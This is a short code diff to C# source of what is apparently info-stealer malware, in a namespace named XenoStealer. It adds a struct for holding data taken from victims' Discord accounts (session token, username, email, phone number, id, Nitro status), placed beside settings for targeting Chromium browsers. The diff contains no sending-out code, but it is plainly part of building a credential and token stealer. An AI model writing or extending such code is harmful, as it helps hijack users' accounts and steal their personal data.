@@ -10,6 +10,27 @@ namespace XenoStealer
     public static class DataExtractionStructs
     {
 
+
+        public struct DiscordUserData 
+        {
+            public string token;
+            public string username;
+            public string email;
+            public string phoneNumber;
+            public string id;
+            public bool hasNitro;
+            public DiscordUserData(string _token, string _username, string _email, string _phoneNumber, string _id, bool _hasNitro) 
+            { 
+                token = _token;
+                username = _username;
+                email = _email;
+                phoneNumber = _phoneNumber;
+                id = _id;
+                hasNitro = _hasNitro;
+            }
+        }
+
+
         [Flags]
         public enum ChromiumBrowserOptions
         {
